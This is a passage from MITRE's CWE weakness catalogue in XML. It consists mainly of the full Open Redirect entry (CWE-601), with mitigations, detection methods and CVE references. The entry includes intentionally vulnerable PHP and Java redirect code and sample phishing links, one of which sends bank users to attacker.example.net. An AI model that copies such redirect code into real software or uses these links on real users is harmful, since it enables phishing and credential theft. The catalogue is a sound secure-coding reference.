               <Previous_Entry_Name Name_Change_Date="2008-04-11">Mobile Code: Invoking
						Untrusted Mobile Code</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-01-12">Download of Untrusted Mobile
						Code Without Integrity Check</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="601" Name="URL Redirection to Untrusted Site ('Open Redirect')" Weakness_Abstraction="Variant" Status="Draft">
         <Description>
            <Description_Summary>A web application accepts a user-controlled input that
					specifies a link to an external site, and uses that link in a Redirect. This
					simplifies phishing attacks.</Description_Summary>
            <Extended_Description>
               <Text>An http parameter may contain a URL value and could cause the web
						application to redirect the request to the specified URL. By modifying the
						URL value to a malicious site, an attacker may successfully launch a
						phishing scam and steal user credentials. Because the server name in the
						modified link is identical to the original site, phishing attempts have a
						more trustworthy appearance.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>864</Relationship_Target_ID>
               <!--2011 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>801</Relationship_Target_ID>
               <!--2010 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>610</Relationship_Target_ID>
               <!--Externally Controlled Reference to a Resource in Another Sphere--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>20</Relationship_Target_ID>
               <!--Improper Input Validation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>442</Relationship_Target_ID>
               <!--Web Problems--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>722</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A1 - Unvalidated Input--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>819</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A10 - Unvalidated Redirects and Forwards--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>990</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Tainted Input to Command--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">928</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>938</Relationship_Target_ID>
               <!--OWASP Top Ten 2013 Category A10 - Unvalidated Redirects and Forwards--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
            <Architectural_Paradigms>
               <Architectural_Paradigm Architectural_Paradigm_Name="Web-based"/>
            </Architectural_Paradigms>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <Text>Phishing is a general term for deceptive attempts to coerce private
						information from users that will be used for identity theft.</Text>
            </Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Open Redirect</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross-site Redirect</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross-domain Redirect</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Low to Medium</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text> The user may be redirected to an untrusted page that contains malware
							which may then compromise the user's machine. This will expose the user
							to extensive risk and the user's interaction with the web server may
							also be compromised if the malware conducts keylogging or other attacks
							that steal credentials, personally identifiable information (PII), or
							other important data. </Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Other</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text> The user may be subjected to phishing attacks by being redirected to
							an untrusted page. The phishing attack may point to an attacker
							controlled web page that appears to be a trusted web site. The phishers
							may then steal the user's credentials and then use these credentials to
							access the legitimate web site.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method_Name>Manual Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Since this weakness does not typically appear frequently within a
							single software package, manual white box techniques may be able to
							provide sufficient code coverage and reduction of false positives if all
							potentially-vulnerable operations can be assessed within limited time
							constraints.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated black box tools that supply URLs to every input may be able
							to spot Location header modifications, but test case coverage is a
							factor, and custom redirects may not be detected. </Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated static analysis tools may not be able to determine whether
							input influences the beginning of a URL, which is important for reducing
							false positives.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Other</Method_Name>
               <Method_Description>
                  <Text>Whether this issue poses a vulnerability will be subject to the
							intended behavior of the application. For example, a search engine might
							intentionally provide redirects to arbitrary URLs.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does.</Text>
                  <Text>When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if the input is
							only expected to contain colors such as "red" or "blue."</Text>
                  <Text>Do not rely exclusively on looking for malicious or malformed inputs
							(i.e., do not rely on a blacklist). A blacklist is likely to miss at
							least one undesirable input, especially if the code's environment
							changes. This can give attackers enough room to bypass the intended
							validation. However, blacklists can be useful for detecting potential
							attacks or determining which inputs are so malformed that they should be
							rejected outright.</Text>
                  <Text>Use a whitelist of approved URLs or domains to be used for
							redirection.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use an intermediate disclaimer page that provides the user with a
							clear warning that they are leaving the current site. Implement a long
							timeout before the redirect occurs, or force the user to click on the
							link. Be careful to avoid XSS problems (CWE-79) when generating the
							disclaimer page.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.2">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Enforcement by Conversion</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When the set of acceptable objects, such as filenames or URLs, is
							limited or known, create a mapping from a set of fixed input values
							(such as numeric IDs) to the actual filenames or URLs, and reject all
							other inputs.</Text>
                  <Text>For example, ID 1 could map to "/login.asp" and ID 2 could map to
							"http://www.example.com/". Features such as the ESAPI AccessReferenceMap
							[R.601.4] provide this capability.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that no externally-supplied requests are honored by requiring
							that all redirect requests include a unique nonce generated by the
							application [R.601.1]. Be sure that the nonce is not predictable
							(CWE-330).</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness_Notes>
                  <Text>Note that this can be bypassed using XSS (CWE-79).</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Understand all the potential areas where untrusted inputs can enter
							your software: parameters or arguments, cookies, anything read from the
							network, environment variables, reverse DNS lookups, query results,
							request headers, URL components, e-mail, files, filenames, databases,
							and any external systems that provide data to the application. Remember
							that such inputs may be obtained indirectly through API calls.</Text>
                  <Text>Many open redirect problems occur because the programmer assumed that
							certain inputs could not be modified, such as cookies and hidden form
							fields.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Firewall</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use an application firewall that can detect attacks against this
							weakness. It can be beneficial in cases in which the code cannot be
							fixed (because it is controlled by a third party), as an emergency
							prevention measure while more comprehensive software assurance measures
							are applied, or to provide defense in depth.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Moderate</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>An application firewall might not cover all possible input vectors. In
							addition, attack techniques might be available to bypass the protection
							mechanism, such as using malformed inputs that can still be processed by
							the component that receives those inputs. Depending on functionality, an
							application firewall might inadvertently reject or modify legitimate
							requests. Finally, some manual effort may be required for
							customization.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code obtains a URL from the query string and then
						redirects the user to that URL. </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code>$redirect_url = $_GET['url'];</Code>
                     <Code>header("Location: " . $redirect_url);</Code>
                  </Block>
                  <Text>The problem with the above code is that an attacker could use this
							page as part of a phishing scam by redirecting users to a malicious
							site. For example, assume the above code is in the file example.php. An
							attacker could supply a user with the following link:</Text>
                  <Block Block_Nature="Attack">
                     <Code> http://example.com/example.php?url=http://malicious.example.com
							</Code>
                  </Block>
                  <Text>The user sees the link pointing to the original trusted site
							(example.com) and does not realize the redirection that could take
							place. </Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code is a Java servlet that will receive a GET request
						with a url parameter in the request to redirect the browser to the address
						specified in the url parameter. The servlet will retrieve the url parameter
						value from the request and send a response to redirect the browser to the
						url address.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>public class RedirectServlet extends HttpServlet {</Code>
                     <Code/>
                     <Block>
                        <Code>protected void doGet(HttpServletRequest request,
									HttpServletResponse response) throws ServletException,
									IOException {</Code>
                        <Block>
                           <Code>String query = request.getQueryString();</Code>
                           <Code>if (query.contains("url")) {</Code>
                           <Block>
                              <Code>String url = request.getParameter("url");</Code>
                              <Code>response.sendRedirect(url); </Code>
                           </Block>
                           <Code>}</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The problem with this Java servlet code is that an attacker could use
							the RedirectServlet as part of a e-mail phishing scam to redirect users
							to a malicious site. An attacker could send an HTML formatted e-mail
							directing the user to log into their account by including in the e-mail
							the following link:</Text>
                  <Block Block_Nature="Attack">
                     <Code_Example_Language>HTML</Code_Example_Language>
                     <Code>&lt;a
								href="http://bank.example.com/redirect?url=http://attacker.example.net"&gt;Click
								here to log in&lt;/a&gt;</Code>
                  </Block>
                  <Text>The user may assume that the link is safe since the URL starts with
							their trusted bank, bank.example.com. However, the user will then be
							redirected to the attacker's web site (attacker.example.net) which the
							attacker may have made to appear very similar to bank.example.com. The
							user may then unwittingly enter credentials into the attacker's web page
							and compromise their bank account. A Java servlet should never redirect
							a user to a URL without verifying that the redirect address is a trusted
							site.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-4206</Observed_Example_Reference>
               <Observed_Example_Description>URL parameter loads the URL into a frame and
						causes it to appear to be part of a valid
						page.</Observed_Example_Description>
               <Observed_Example_Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4206</Observed_Example_Link>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2951</Observed_Example_Reference>
               <Observed_Example_Description>An open redirect vulnerability in the search
						script in the software allows remote attackers to redirect users to
						arbitrary web sites and conduct phishing attacks via a URL as a parameter to
						the proper function.</Observed_Example_Description>
               <Observed_Example_Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2951</Observed_Example_Link>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2052</Observed_Example_Reference>
               <Observed_Example_Description>Open redirect vulnerability in the software allows
						remote attackers to redirect users to arbitrary web sites and conduct
						phishing attacks via a URL in the proper
						parameter.</Observed_Example_Description>
               <Observed_Example_Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2052</Observed_Example_Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Local_Reference_ID="R.601.1">
               <Reference_Author>Craig A. Shue</Reference_Author>
               <Reference_Author>Andrew J. Kalafut</Reference_Author>
               <Reference_Author>Minaxi Gupta</Reference_Author>
               <Reference_Title>Exploitable Redirects on the Web: Identification, Prevalence,
						and Defense</Reference_Title>
               <Reference_Link>http://www.cs.indiana.edu/cgi-pub/cshue/research/woot08.pdf</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.601.2">
               <Reference_Author>Russ McRee</Reference_Author>
               <Reference_Title>Open redirect vulnerabilities: definition and
						prevention</Reference_Title>
               <Reference_Section>Page 43</Reference_Section>
               <Reference_Edition>Issue 17</Reference_Edition>
               <Reference_Publication>(IN)SECURE</Reference_Publication>
               <Reference_PubDate>July 2008</Reference_PubDate>
               <Reference_Link>http://www.net-security.org/dl/insecure/INSECURE-Mag-17.pdf</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.601.3">
               <Reference_Author>Jason Lam</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 23 - Open Redirect</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-25</Reference_Date>
               <Reference_Link>http://software-security.sans.org/blog/2010/03/25/top-25-series-rank-23-open-redirect</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.601.4">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Anonymous Tool Vendor (under NDA)">
               <Mapped_Node_Name/>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>URl Redirector Abuse </Mapped_Node_Name>
               <Mapped_Node_ID>38</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Tainted input to command</Mapped_Node_Name>
               <Mapped_Node_ID>SFP24</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>194</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>Anonymous Tool Vendor (under NDA)</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Background_Details, Description,
						Detection_Factors, Likelihood_of_Exploit, Name, Relationships,
						Observed_Example, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-03</Modification_Date>
               <Modification_Comment>updated References and
						Observed_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Observed_Examples,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors,
						Likelihood_of_Exploit, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Detection_Factors, Potential_Mitigations, Related_Attack_Patterns,
						Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations,
						References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-04-11">Unsafe URL
						Redirection</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2008-09-09">URL Redirection to Untrusted
						Site</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2009-05-27">URL Redirection to Untrusted
						Site (aka 'Open Redirect')</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="676" Name="Use of Potentially Dangerous Function" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The program invokes a potentially dangerous function that could
					introduce a vulnerability if it is used incorrectly, but the function can also
					be used safely.</Description_Summary>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>865</Relationship_Target_ID>
               <!--2011 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>398</Relationship_Target_ID>
               <!--Indicator of Poor Code Quality--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>738</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 04 - Integers (INT)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>743</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 09 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>746</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 12 - Error Handling (ERR)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>872</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 04 - Integers (INT)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>877</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 09 - Input Output (FIO)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>1001</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Use of an Improper API--></Relationship>
         </Relationships>
